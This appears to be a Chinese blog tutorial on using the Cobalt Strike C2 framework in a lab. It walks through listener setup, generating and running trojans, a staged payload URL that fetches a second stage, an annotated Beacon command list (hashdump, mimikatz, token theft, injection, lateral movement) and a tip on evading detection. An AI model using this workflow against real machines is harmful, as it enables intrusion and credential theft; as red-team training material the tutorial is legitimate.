+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">别名 <span class="comment"># 类似于备注随便写</span></span><br><span class="line">主机 <span class="comment"># 写你VPS/虚拟机IP(必须互通)</span></span><br><span class="line">端口 <span class="comment"># teamserver监听的端口</span></span><br><span class="line">用户 <span class="comment"># 随便写,别和同一台服务器中的其他用户重复即可</span></span><br><span class="line">密码 <span class="comment"># 定义的密码</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916045.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916722.png" data-fancybox="true"/></div></div>
+
+<p>指纹Hash一样,默认点Yes即可</p>
+<h2 id="菜单栏详情"><a href="#菜单栏详情" class="headerlink" title="菜单栏详情"></a>菜单栏详情</h2><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New Connection    <span class="comment"># 新建连接，支持连接多个服务器端</span></span><br><span class="line">Preferences            <span class="comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization           # 主要展示输出结果的视图</span></span><br><span class="line">VPN Interfaces       <span class="comment"># 设置VPN接口</span></span><br><span class="line">Listenrs                   <span class="comment"># 创建监听器</span></span><br><span class="line">Script Manager      <span class="comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Applications        <span class="comment"># 显示受害主机的应用信息</span></span><br><span class="line">Credentials          <span class="comment"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz Downloads          # 查看已下载文件</span></span><br><span class="line">Event Log            <span class="comment"># 主机上线记录以及团队协作聊天记录</span></span><br><span class="line">Keystrokes           <span class="comment"># 查看键盘记录结果</span></span><br><span class="line">Proxy Pivots        <span class="comment"># 查看代理模块</span></span><br><span class="line">Screenshots        <span class="comment"># 查看所有屏幕截图</span></span><br><span class="line">Script Console    <span class="comment"># 加载第三方脚本以增强功能 </span></span><br><span class="line">Targets               <span class="comment"># 显示所有受害主机</span></span><br><span class="line">Web Log            <span class="comment"># 所有Web服务的日志</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h3><h4 id="Packages-生成后门"><a href="#Packages-生成后门" class="headerlink" title="Packages(生成后门)"></a>Packages(生成后门)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTML Application      <span class="comment"># 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件MS Office Macro        # 生成office宏病毒文件</span></span><br><span class="line">Payload Generator     <span class="comment"># 生成各种语言版本的payload</span></span><br><span class="line">Windows Executable   <span class="comment"># 生成可执行exe木马</span></span><br><span class="line">Windows Executable(Stageless)   <span class="comment"># 生成无状态的可执行exe木马</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Web-Drive-by-钓鱼攻击"><a href="#Web-Drive-by-钓鱼攻击" class="headerlink" title="Web Drive-by(钓鱼攻击)"></a>Web Drive-by(钓鱼攻击)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manage <span class="comment"># 对开启的web服务进行管理</span></span><br><span class="line">Clone Site <span class="comment"># 克隆网站，可以记录受害者提交的数据</span></span><br><span class="line">Host File <span class="comment"># 提供文件下载，可以选择Mime类型</span></span><br><span class="line">Scripted Web Delivery <span class="comment"># 为payload提供web服务以便下载和执行，类似于Metasploit的</span></span><br><span class="line">web_delivery </span><br><span class="line">Signed Applet Attack <span class="comment"># 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span></span><br><span class="line">Smart Applet Attack <span class="comment"># 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以</span></span><br><span class="line">下版本(该方法已过时)</span><br><span class="line">System Profiler <span class="comment"># 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="钓鱼邮件-弃用"><a href="#钓鱼邮件-弃用" class="headerlink" title="钓鱼邮件(弃用)"></a>钓鱼邮件(弃用)</h4><h4 id="Reporting-报告"><a href="#Reporting-报告" class="headerlink" title="Reporting(报告)"></a>Reporting(报告)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Activity Report <span class="comment"># 活动报告</span></span><br><span class="line">Hosts Report <span class="comment"># 主机报告</span></span><br><span class="line">Indicators of Compromise <span class="comment"># IOC报告:包括C2配置文件的流量分析、域名、IP和上传文件的MD5 </span></span><br><span class="line">hashes</span><br><span class="line">Sessions Report <span class="comment"># 会话报告</span></span><br><span class="line">Social Engineering Report <span class="comment"># 社会工程报告:包括鱼叉钓鱼邮件及点击记录</span></span><br><span class="line">Tactics, Techniques, and Procedures <span class="comment"># 战术技术及相关程序报告:包括行动对应的每种战术的检测</span></span><br><span class="line">策略和缓解策略</span><br><span class="line">Reset Data <span class="comment"># 重置数据</span></span><br><span class="line">Export Data <span class="comment"># 导出数据，导出.tsv文件格式</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Homepage <span class="comment"># 官方主页</span></span><br><span class="line">Support <span class="comment"># 技术支持</span></span><br><span class="line">Arsenal <span class="comment"># 开发者</span></span><br><span class="line">System information <span class="comment"># 版本信息</span></span><br><span class="line">About <span class="comment"># 关于</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h2><p>依次为:</p>
+<ol>
+<li>新建连接 </li>
+<li>断开当前连接 </li>
+<li>监听器 </li>
+<li>改变视图为Pivot Graph(视图列表) </li>
+<li>改变视图为Session Table(会话列表) </li>
+<li>改变视图为Target Table(目标列表) </li>
+<li>显示所有以获取的受害主机的凭证 </li>
+<li>查看已下载文件 </li>
+<li>查看键盘记录结果 </li>
+<li>查看屏幕截图 </li>
+<li>生成无状态的可执行exe木马 </li>
+<li>使用java自签名的程序进行钓鱼攻击 </li>
+<li>生成office宏病毒文件 </li>
+<li>为payload提供web服务以便下载和执行 </li>
+<li>提供文件下载，可以选择Mime类型 </li>
+<li>管理Cobalt Strike上运行的web服务 </li>
+<li>帮助 </li>
+<li>关于</li>
+</ol>
+<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h3><blockquote>
+<p>什么是监听器?</p>
+<p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。 </p>
+<p>监听器的作用?</p>
+<p>主要是为了接受payload回传的各类数据, 比如payload在目标机器执行以后，就会回连到监听器 , </p>
+<p>然后下载执行真正的shellcode代码</p>
+</blockquote>
+<p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境， </p>
+<p>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 </p>
+<p>监听器的名字一般由以下结构组成:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Operating System/Payload/Stager </span><br><span class="line">如 : windows/beacon_http/reverse_http </span><br></pre></td></tr></table></figure>
+
+<p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了8个Listener</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916099.png" data-fancybox="true"/></div></div>
+
+<p>包括dns、http、https、smb tcp 五种协议, External C2, 使用外部的命令与控制(C2)工具或框架，而不是使用 Cobalt Strike 默认的内置监听器, 可以配合其他c2作为后端, Foreign HTTP, 允许Beacon 使用外部的HTTP服务器进行C2通信，而不是使用 Cobalt Strike 内置的Beacon监听器</p>
+<ol>
+<li>Name随便写</li>
+<li>选择所需的Payload</li>
+<li>Host为VPS_IP</li>
+<li>Port为此Payload监听的端口,未被占用即可</li>
+</ol>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916390.png" data-fancybox="true"/></div></div>
+
+<p>监听成功后,在服务端有对应的日志</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916782.png" data-fancybox="true"/></div></div>
+
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917271.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917019.png" data-fancybox="true"/></div></div>
+
+<h3 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h3><p>双击木马上线</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917632.png" data-fancybox="true"/></div></div>
+
+<p>选中受害机右击，选择beacon，即可进行交互，由于受害机默认60秒进行一次回传，可以把时间设置成1或其他，但实际中频率不宜过快，容易被发现</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917687.png" data-fancybox="true"/></div></div>
+
+<p>或者进入会话,在下方输入<code>sleep 1</code>也可以</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917367.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241953934.png" data-fancybox="true"/></div></div>
+
+<p>执行系统命令</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917806.png" data-fancybox="true"/></div></div>
+
+<p>通信图</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917303.png" data-fancybox="true"/></div></div>
+
+
+
+<h2 id="Beacon介绍"><a href="#Beacon介绍" class="headerlink" title="Beacon介绍"></a>Beacon介绍</h2><h3 id="Beacon是什么"><a href="#Beacon是什么" class="headerlink" title="Beacon是什么?"></a>Beacon是什么?</h3><blockquote>
+<p>Beacon是CS的Payload ( 攻击载荷 ) </p>
+<p>Beacon有两种通信模式。</p>
+<ol>
+<li>异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；</li>
+<li>交互式通信模式，这种模式的通信是实时发生的。</li>
+</ol>
+<p>通过HTTP、HTTPS和DNS出口网络。使用SMB协议的时候是点对点通信 </p>
+</blockquote>
+<h3 id="Beacon的类型"><a href="#Beacon的类型" class="headerlink" title="Beacon的类型"></a>Beacon的类型</h3><ul>
+<li>HTTP 和 HTTPS Beacon</li>
+</ul>
+<p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。<br>当受害机上线以后，右击选择Interact ，就可以打开Beacon Console</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line">Command                   Description</span><br><span class="line">-------                   -----------</span><br><span class="line">!                         运行历史命令</span><br><span class="line">argue                     命令行参数欺骗</span><br><span class="line">blockdlls                 禁止子进程加载非微软签名的dll</span><br><span class="line">browserpivot              注入浏览器进程代理用户已认证身份(仅支持IE)</span><br><span class="line">cancel                    取消正在下载的文件</span><br><span class="line"><span class="built_in">cd</span>                        跳转目录</span><br><span class="line">checkin                   强制目标回连并更新状态(用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver)</span><br><span class="line">chromedump                提取Chrome保存的账号密码、Cookies等信息</span><br><span class="line">clear                     清空beacon任务队列</span><br><span class="line">connect                   通过TCP正向连接远程Beacon</span><br><span class="line">covertvpn                 部署Covert VPN客户端</span><br><span class="line"><span class="built_in">cp</span>                        复制文件</span><br><span class="line">dcsync                    从域控提取密码<span class="built_in">hash</span></span><br><span class="line">desktop                   远程VNC控制用户桌面</span><br><span class="line">dllinject                 注入一个内存反射加载的dll到目标进程</span><br><span class="line">dllload                   使用LoadLibrary方式在目标进程中加载一个dll</span><br><span class="line">download                  下载文件</span><br><span class="line">downloads                 列出所有正在下载的文件</span><br><span class="line">drives                    列出所有磁盘盘符</span><br><span class="line">elevate                   利用提权漏洞获取一个高权限Beacon</span><br><span class="line">execute                   在目标上执行程序(无回显)</span><br><span class="line">execute-assembly          在目标上内存加载执行本地.NET程序</span><br><span class="line"><span class="built_in">exit</span>                      结束当前Beacon会话</span><br><span class="line">getprivs                  在当前进程访问令牌(access token)中启用system特权</span><br><span class="line">getsystem                 尝试获取SYSTEM用户权限</span><br><span class="line">getuid                    获取当前进程访问令牌(access token)的用户信息</span><br><span class="line">hashdump                  获取本地用户<span class="built_in">hash</span></span><br><span class="line"><span class="built_in">help</span>                      帮助信息</span><br><span class="line"><span class="built_in">history</span>                   显示历史命令记录</span><br><span class="line">inject                    在指定进程中注入新的Beacon会话</span><br><span class="line">inline-execute            在当前会话中执行Beacon Object File</span><br><span class="line">jobkill                   结束一个后台任务</span><br><span class="line"><span class="built_in">jobs</span>                      列出所有后台任务</span><br><span class="line">jump                      在远程机器上植入Beacon(横向移动)</span><br><span class="line">kerberos_ccache_use       从ccache文件导入kerberos票据到当前会话中</span><br><span class="line">kerberos_ticket_purge     清空当前会话中的所有kerberos票据</span><br><span class="line">kerberos_ticket_use       从ticket文件中导入kerberos票据到当前会话中</span><br><span class="line">keylogger                 开启键盘记录</span><br><span class="line"><span class="built_in">kill</span>                      结束指定进程</span><br><span class="line"><span class="built_in">link</span>                      通过命名管道正向连接远程Beacon</span><br><span class="line">logonpasswords            使用mimikatz获取密码和<span class="built_in">hash</span></span><br><span class="line"><span class="built_in">ls</span>                        列出目录文件</span><br><span class="line">make_token                创建进程访问令牌(access token)，仅用于访问网络资源</span><br><span class="line">mimikatz                  运行mimikatz</span><br><span class="line"><span class="built_in">mkdir</span>                     创建目录</span><br><span class="line">mode dns                  使用DNS A记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line">mode dns-txt              使用DNS TXT记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line">mode dns6                 使用DNS AAAA记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line"><span class="built_in">mv</span>                        移动文件</span><br><span class="line">net                       网络和主机探测工具(内置net命令)</span><br><span class="line">note                      给当前会话添加备注信息</span><br><span class="line">portscan                  网络端口扫描</span><br><span class="line">powerpick                 内存执行Powershell命令(不调用powershell.exe)</span><br><span class="line">powershell                通过powershell.exe执行Powershell命令</span><br><span class="line">powershell-import         导入本地powershell脚本到当前会话中</span><br><span class="line">ppid                      为所有新运行的进程设置伪造的父进程PID</span><br><span class="line">printscreen               使用PrintScr方式截屏</span><br><span class="line">ps                        显示进程列表</span><br><span class="line">psinject                  注入到指定进程后在内存中执行Powershell命令(不调用powershell.exe)</span><br><span class="line">pth                       使用Mimikatz执行Pass-the-hash</span><br><span class="line"><span class="built_in">pwd</span>                       显示当前目录</span><br><span class="line">reg                       查询注册表</span><br><span class="line">remote-exec               在远程机器上执行命令(横向移动)</span><br><span class="line">rev2self                  恢复原始进程访问令牌(access token)</span><br><span class="line"><span class="built_in">rm</span>                        删除文件或文件夹</span><br><span class="line">rportfwd                  反向端口转发(从Cobalt Strike Teamserver发起连接)</span><br><span class="line">rportfwd_local            反向端口转发(从Cobalt Strike客户端发起连接)</span><br><span class="line">run                       在目标上执行程序(有回显)</span><br><span class="line">runas                     以另一个用户身份执行程序</span><br><span class="line">runasadmin                以高权限执行程序</span><br><span class="line">runu                      以另一个进程PID作为父进程PID，并以其用户身份执行程序</span><br><span class="line">screenshot                截屏</span><br><span class="line">screenwatch               屏幕监控，每隔一段时间截屏</span><br><span class="line">setenv                    设置环境变量</span><br><span class="line">shell                     使用cmd.exe执行命令</span><br><span class="line">shinject                  注入shellcode到指定进程中</span><br><span class="line">shspawn                   创建傀儡进程并注入shellcode到其中运行</span><br><span class="line"><span class="built_in">sleep</span>                     设置beacon回连间隔时间</span><br><span class="line">socks                     启动SOCKS4a代理服务器</span><br><span class="line">socks stop                停止SOCKS4a代理服务器</span><br><span class="line">spawn                     创建一个新Beacon会话</span><br><span class="line">spawnas                   以另一个用户身份创建一个新Beacon会话</span><br><span class="line">spawnto                   设置创建新进程时使用的可执行文件路径(傀儡进程的宿主exe文件路径)</span><br><span class="line">spawnu                    以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话</span><br><span class="line">spunnel                   运行第三方agent shellcode并将其反向代理到控制端(从Cobalt Strike Teamserver发起连接)</span><br><span class="line">spunnel_local             运行第三方agent shellcode并将其反向代理到控制端(从Cobalt Strike客户端发起连接)</span><br><span class="line">ssh                       通过SSH连接远程主机(使用账号密码认证)</span><br><span class="line">ssh-key                   通过SSH连接远程主机(使用证书私钥认证)</span><br><span class="line">steal_token               从指定进程中窃取访问令牌(access token)</span><br><span class="line">timestomp                 复制B文件的创建、访问、修改时间戳到A文件(文件时间戳伪造)</span><br><span class="line"><span class="built_in">unlink</span>                    断开与beacon的连接(用于通过TCP、命名管道连接的beacon)</span><br><span class="line">upload                    上传文件</span><br></pre></td></tr></table></figure>
+
+<p>可用<code>help 命令</code>的方式查看具体命令参数说明</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918299.png" data-fancybox="true"/></div></div>
+
+<p>退出会话:选中会话 , 右键退出回话 , 然后删除回话 , 如果再次上线了, 再删除一次</p>
+<h2 id="CS上线类型"><a href="#CS上线类型" class="headerlink" title="CS上线类型"></a>CS上线类型</h2><h3 id="exe上线-有阶段"><a href="#exe上线-有阶段" class="headerlink" title="exe上线(有阶段)"></a>exe上线(有阶段)</h3><p>攻击 -&gt; 生成后门 -&gt; windows可执行程序 , 选择监听器和对应的操作系统位数</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918002.webp" data-fancybox="true"/></div></div>
+
+<p><strong>注意</strong>:有阶段的后门,你在双击时可以在CS的<code>Web Log</code>中可以看到请求信息,这是双击时只是第一阶段会请求网址下载第二阶段的完整后门</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918392.png" data-fancybox="true"/></div></div>
+
+<p>将VPS的IP和<code>Request:Get</code>后的路径组和起来就是<code>http://192.168.74.131/EjZT</code></p>
